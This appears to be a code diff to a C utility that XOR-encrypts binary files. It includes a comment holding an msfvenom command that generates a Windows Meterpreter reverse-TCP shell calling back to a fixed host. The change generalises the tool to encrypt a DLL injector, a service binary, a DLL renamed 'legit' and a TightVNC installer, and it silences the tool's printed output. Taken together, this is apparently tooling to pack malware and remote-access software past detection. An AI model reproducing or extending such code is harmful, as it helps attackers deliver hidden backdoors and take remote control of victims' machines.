@@ -1,19 +1,19 @@
 #include <stdio.h>
-#include <windows.h>
+#include <stdlib.h>
 
 
 /* msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.100.13 LPORT=123 -f csharp exitfunc=thread*/
 
-void encrypt(unsigned char *data, SIZE_T data_size, char key) {
-    printf("[+] ENCRYPTING with '%c' key\n", key);
+void encrypt(unsigned char *data, size_t data_size, char key) {
+    //printf("[+] ENCRYPTING with '%c' key\n", key);
     for (int i = 0; i < data_size; i++) {
         //printf("\\x%02x", data[i] ^ key);
         data[i] = data[i] ^ key;
     }
-    printf("\n");
+   // printf("\n");
 }
 
-void decrypt(unsigned char *data, SIZE_T data_size, char key) {
+void decrypt(unsigned char *data, size_t data_size, char key) {
 	printf("[+] DECRYPTING with '%c' key\n", key);
 	for (int i = 0; i < data_size; i++) {
 		printf("\\x%02x", data[i] ^ key);
@@ -22,17 +22,18 @@ void decrypt(unsigned char *data, SIZE_T data_size, char key) {
 	printf("\n");
 }
 
-int main() {
+
+int file_ops(char *input_filename,char *output_filename){
     // Open the binary file
-    FILE *input_file = fopen("malicious_dll.dll", "rb");
+    FILE *input_file = fopen(input_filename, "rb");
     if (input_file == NULL) {
-        printf("[x] Failed to open input file\n");
+        printf("[x] Failed to open %s\n",input_filename);
         return 1;
     }
 
     // Get the size of the input file
     fseek(input_file, 0, SEEK_END);
-    SIZE_T file_size = ftell(input_file);
+    size_t file_size = ftell(input_file);
     fseek(input_file, 0, SEEK_SET);
 
     // Allocate memory for the file data
@@ -55,11 +56,11 @@ int main() {
     fclose(input_file);
 
     // Print original data (optional)
-    printf("[+] ORIGINAL DATA\n");
-    for (SIZE_T i = 0; i < file_size; i++) {
-        printf("\\x%02x", data[i]);
+    //printf("[+] ORIGINAL DATA\n");
+    for (size_t i = 0; i < file_size; i++) {
+        //printf("\\x%02x", data[i]);
     }
-    printf("\n");
+    //printf("\n");
 
     // Encrypt the data with a series of keys
     char keys[]={'P','L','S','a','5','p','A','1','w','F'};
@@ -68,7 +69,7 @@ int main() {
     }
 
     // Write the encrypted data to a new file
-    FILE *output_file = fopen("malicious_dll_enc.dll", "wb");
+    FILE *output_file = fopen(output_filename, "wb");
     if (output_file == NULL) {
         printf("[x] Failed to open output file\n");
         free(data);
@@ -82,11 +83,19 @@ int main() {
         return 1;
     }
 
-    printf("[+] Encrypted data written to file\n");
+    printf("[+] Encrypted data written to %s\n",output_filename);
 
     // Clean up
     free(data);
     fclose(output_file);
+	return 0;
+}
+
+int main() {
+	file_ops("legit.dll","legit_enc.dll");
+	file_ops("dll_injector.exe","dll_injector_enc.exe");
+	file_ops("win_service32.exe","win_service32_enc.exe");
+	file_ops("tightVNC.msi","tightVNC_enc.msi");
 
     return 0;
 }
